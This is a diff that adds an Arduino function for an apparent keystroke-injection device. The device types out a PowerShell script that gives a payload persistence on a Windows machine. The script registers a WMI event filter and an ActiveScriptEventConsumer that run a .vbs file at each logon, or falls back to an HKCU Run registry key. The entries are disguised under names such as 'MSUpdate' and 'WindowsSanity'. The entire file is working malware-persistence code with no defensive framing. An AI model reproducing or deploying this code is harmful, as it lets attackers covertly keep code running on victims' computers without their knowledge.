@@ -1,0 +1,40 @@
+void persist(String filename)
+{
+    Keyboard.print(F("echo $cp = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo if($cp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true) { >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo $fns = \"root\\\cimv2\" >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo $wns = \"root\\\subscription\" >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo $qy = \"Select * from __InstanceCreationEvent within 30 where targetInstance isa 'Win32_LogonSession'\" >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo $fn = \"MSUpdate\" >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo $fp = Set-WmiInstance -Class __EventFilter -Namespace $wns -Arguments @{name=$fn; EventNameSpace=$fns; QueryLanguage=\"WQL\"; Query=$qy} >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo $cp = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wns -Arguments @{name=\"WindowsSanity\"; ScriptFileName=\"$env:TEMP\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.print(F(".vbs\" >> %temp%\\\"));
+    Keyboard.print(F("; ScriptingEngine=\"VBScript\"} >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wns -arguments @{Filter=$fp; Consumer=$cp} ^|  out-null } >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+    Keyboard.print(F("echo else {New-ItemProperty -Path HKCU:Software\\\Microsoft\\\Windows\\\CurrentVersion\\\Run\\\ -Name Update -PropertyType String -Value \"$env:TEMP\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.print(F(".vbs\""));
+    Keyboard.print(F("-force } >> %temp%\\\"));
+    Keyboard.print(F(filename));
+    Keyboard.println(F(".ps1"));
+
+}
